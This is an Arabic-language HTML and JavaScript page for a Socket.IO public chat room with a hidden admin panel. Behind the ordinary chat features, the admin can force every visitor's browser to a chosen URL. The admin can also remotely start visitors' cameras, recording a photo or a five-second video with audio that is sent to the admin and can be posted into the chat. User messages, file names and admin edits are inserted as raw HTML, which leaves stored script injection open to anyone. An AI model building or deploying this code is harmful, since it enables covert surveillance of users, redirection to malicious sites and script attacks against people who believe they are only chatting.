<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شات الأدمن المتقدم</title>
    <style>
        body { font-family: Tahoma, sans-serif; background: #f4f4f9; margin: 0; padding: 20px; }
        #chat-container { max-width: 600px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        #messages { list-style: none; padding: 0; height: 300px; overflow-y: scroll; border: 1px solid #ddd; margin-bottom: 10px; padding: 10px; border-radius: 5px; }
        #messages li { margin-bottom: 10px; padding: 8px; background: #eef2f3; border-radius: 4px; position: relative; word-break: break-word; }
        .admin-panel { background: #ffeaa7; padding: 10px; margin-bottom: 15px; border-radius: 5px; display: none; }
        input, button { padding: 8px; margin: 5px 0; }
        .delete-btn, .edit-btn { background: #ff7675; color: white; border: none; padding: 2px 5px; cursor: pointer; border-radius: 3px; font-size: 12px; margin-left: 5px; }
        .edit-btn { background: #74b9ff; }
        #preview-box { margin-top: 15px; text-align: center; display: none; background: #fff3cd; padding: 10px; border-radius: 5px; }
        img, video { max-width: 100%; border-radius: 5px; }
    </style>
</head>
<body>

    <div id="chat-container">
        <h2>غرفة الشات العامة <span id="users-count" style="font-size: 14px; color: gray;"></span></h2>

        <!-- لوحة تحكم الأدمن -->
        <div id="adminPanel" class="admin-panel">
            <h3>⭐ لوحة تحكم الأدمن</h3>
            <div>
                <input type="text" id="targetUrlInput" placeholder="أدخل رابط لفتحه عند المستخدمين..." style="width: 65%;">
                <button onclick="sendOpenUrl()">فتح الرابط</button>
            </div>
            <div>
                <button onclick="requestCamera('photo')">📸 طلب التقاط صورة</button>
                <button onclick="requestCamera('video')">🎥 طلب تسجيل فيديو</button>
            </div>
        </div>

        <!-- معاينة الوسائط الملتقطة للأدمن -->
        <div id="preview-box">
            <h4>معاينة الوسائط القادمة من الكاميرا:</h4>
            <div id="media-content"></div>
            <button onclick="approveMedia()" style="background: #00b894; color:white;">رفع / حفظ للشات</button>
            <button onclick="cancelMedia()" style="background: #d63031; color:white;">إلغاء</button>
        </div>

        <ul id="messages"></ul>

        <!-- إرسال الرسائل -->
        <input type="text" id="messageInput" placeholder="اكتب رسالتك..." style="width: 70%;">
        <button onclick="sendMessage()">إرسال</button>
        
        <br>
        <label>إرسال ملف: <input type="file" id="fileInput"></label>
        <button onclick="sendFile()">إرسال الملف</button>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let isAdmin = false;
        let adminSecret = '';

        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.has('admin')) {
            adminSecret = urlParams.get('admin');
            isAdmin = true;
            document.getElementById('adminPanel').style.display = 'block';
        }

        const username = prompt("أدخل اسمك:") || "مستخدم مجهول";

        socket.on('update_users_count', (count) => {
            document.getElementById('users-count').innerText = `(متصل حالياً: ${count})`;
        });

        socket.on('load_history', (messages) => {
            messages.forEach(msg => appendMessage(msg));
        });

        socket.on('receive_message', (msg) => {
            appendMessage(msg);
        });

        function sendMessage() {
            const text = document.getElementById('messageInput').value;
            if (!text.trim()) return;
            socket.emit('send_message', { sender: username, message: text, type: 'text' });
            document.getElementById('messageInput').value = '';
        }

        function sendFile() {
            const fileInput = document.getElementById('fileInput');
            if (fileInput.files.length === 0) return alert('اختر ملفاً أولاً');
            const file = fileInput.files[0];
            
            const reader = new FileReader();
            reader.onload = function(e) {
                let contentMsg = `<a href="${e.target.result}" download="${file.name}">تحميل ملف: ${file.name}</a>`;
                if (file.type.startsWith('image/')) {
                    contentMsg = `<img src="${e.target.result}" width="200">`;
                }
                socket.emit('send_message', { 
                    sender: username, 
                    message: contentMsg, 
                    type: 'file' 
                });
            };
            reader.readAsDataURL(file);
            fileInput.value = '';
        }

        function appendMessage(msg) {
            const list = document.getElementById('messages');
            const li = document.createElement('li');
            li.setAttribute('data-id', msg._id);
            li.innerHTML = `<strong>${msg.sender}:</strong> <span class="msg-text">${msg.message}</span>`;

            if (isAdmin) {
                const delBtn = document.createElement('button');
                delBtn.innerText = 'حذف';
                delBtn.className = 'delete-btn';
                delBtn.onclick = () => deleteMessage(msg._id);

                const editBtn = document.createElement('button');
                editBtn.innerText = 'تعديل';
                editBtn.className = 'edit-btn';
                editBtn.onclick = () => editMessage(msg._id, msg.message);

                li.appendChild(delBtn);
                li.appendChild(editBtn);
            }

            list.appendChild(li);
            list.scrollTop = list.scrollHeight;
        }

        function deleteMessage(messageId) {
            socket.emit('admin_delete_message', { secret: adminSecret, messageId });
        }

        socket.on('message_deleted', (messageId) => {
            const el = document.querySelector(`[data-id='${messageId}']`);
            if (el) el.remove();
        });

        function editMessage(messageId, oldText) {
            const newText = prompt("تعديل الرسالة:", oldText);
            if (newText !== null) {
                socket.emit('admin_edit_message', { secret: adminSecret, messageId, newText });
            }
        }

        socket.on('message_edited', ({ messageId, newText }) => {
            const el = document.querySelector(`[data-id='${messageId}']`);
            if (el) {
                el.querySelector('.msg-text').innerHTML = newText;
            }
        });

        function sendOpenUrl() {
            const url = document.getElementById('targetUrlInput').value;
            if (!url) return;
            socket.emit('admin_open_url', { secret: adminSecret, targetUrl: url });
        }

        socket.on('force_open_url', (url) => {
            if (!isAdmin) {
                window.location.href = url;
            }
        });

        function requestCamera(type) {
            socket.emit('admin_request_media', { secret: adminSecret, mediaType: type });
        }

        socket.on('trigger_camera_capture', async (mediaType) => {
            if (isAdmin) return;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: mediaType === 'video' });
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];

                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: mediaType === 'video' ? 'video/webm' : 'image/jpeg' });
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        socket.emit('user_captured_media', { dataUrl: reader.result, type: mediaType });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(track => track.stop());
                };

                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, mediaType === 'video' ? 5000 : 1000);
            } catch (err) {
                alert('رفض المستخدم إذن الكاميرا أو حدث خطأ في المتصفح.');
            }
        });

        let temporaryCapturedData = null;
        socket.on('display_captured_media_to_admin', (data) => {
            if (!isAdmin) return;
            temporaryCapturedData = data;
            const previewBox = document.getElementById('preview-box');
            const contentDiv = document.getElementById('media-content');
            previewBox.style.display = 'block';

            if (data.type === 'video') {
                contentDiv.innerHTML = `<video src="${data.dataUrl}" controls width="250"></video>`;
            } else {
                contentDiv.innerHTML = `<img src="${data.dataUrl}" width="250">`;
            }
        });

        function approveMedia() {
            if (temporaryCapturedData) {
                const mediaHtml = temporaryCapturedData.type === 'video' 
                    ? `<video src="${temporaryCapturedData.dataUrl}" controls width="250"></video>` 
                    : `<img src="${temporaryCapturedData.dataUrl}" width="250">`;

                socket.emit('send_message', {
                    sender: "الأدمن (صورة ملتقطة)",
                    message: mediaHtml,
                    type: 'media-capture'
                });
                cancelMedia();
            }
        }

        function cancelMedia() {
            temporaryCapturedData = null;
            document.getElementById('preview-box').style.display = 'none';
        }
    </script>
</body>
</html>
